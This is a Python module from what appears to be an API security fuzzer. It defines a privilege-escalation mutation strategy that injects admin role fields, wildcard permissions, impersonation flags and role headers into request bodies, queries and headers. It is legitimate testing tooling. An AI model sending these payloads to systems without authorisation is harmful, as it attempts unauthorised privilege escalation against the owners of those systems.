from __future__ import annotations

from typing import Any
from typing import Iterator

from rsfuzzer.mutations.strategies.base import _merge_body
from rsfuzzer.mutations.types import MutationTrace


def _body_overlays(*, light: bool) -> Iterator[dict[str, Any]]:
    core: list[dict[str, Any]] = [
        {"role": "admin"},
        {"role": "superuser"},
        {"roles": ["admin"]},
        {"admin": True},
        {"isAdmin": True},
        {"is_admin": 1},
        {"user_id": "2"},
        {"userId": "00000000-0000-0000-0000-000000000001"},
        {"owner_id": "other"},
        {"permissions": ["*"]},
        {"scope": "admin full"},
        {"access": "root"},
        {"elevated": True},
        {"impersonate": True},
        {"act_as": "admin"},
    ]
    if light:
        yield from core[:8]
    else:
        yield from core
        yield {"__role": "admin"}
        yield {"accountType": "SYSTEM"}


def _query_pairs(*, light: bool) -> Iterator[tuple[str, str]]:
    pairs = [
        ("role", "admin"),
        ("admin", "true"),
        ("isAdmin", "1"),
        ("debug", "1"),
        ("override", "true"),
        ("impersonate", "1"),
        ("as_user", "admin"),
        ("privilege", "elevated"),
    ]
    for k, v in (pairs[:5] if light else pairs):
        yield k, v


class PrivilegeEscalationStrategy:
    """Attribute / role injection for vertical privilege escalation probes."""

    id = "privilege_escalation"
    category = "privilege_escalation"

    def __init__(self, *, light: bool = False) -> None:
        self._light = light

    def mutate_body(
        self,
        body: dict[str, Any] | None,
    ) -> Iterator[tuple[dict[str, Any], MutationTrace]]:
        for overlay in _body_overlays(light=self._light):
            merged = _merge_body(body, overlay)
            trace = MutationTrace(self.id, self.category, {"overlay_keys": list(overlay.keys())})
            yield merged, trace

    def mutate_query(
        self,
        query: dict[str, str],
    ) -> Iterator[tuple[dict[str, str], MutationTrace]]:
        for k, v in _query_pairs(light=self._light):
            q = dict(query)
            q[k] = v
            trace = MutationTrace(self.id, self.category, {"injected_param": k, "value": v})
            yield q, trace

    def mutate_headers(
        self,
        headers: dict[str, str],
    ) -> Iterator[tuple[dict[str, str], MutationTrace]]:
        h = dict(headers)
        h["X-Role"] = "admin"
        trace = MutationTrace(self.id, self.category, {"header": "X-Role"})
        yield h, trace
        h2 = dict(headers)
        h2["X-User-Role"] = "administrator"
        trace2 = MutationTrace(self.id, self.category, {"header": "X-User-Role"})
        yield h2, trace2
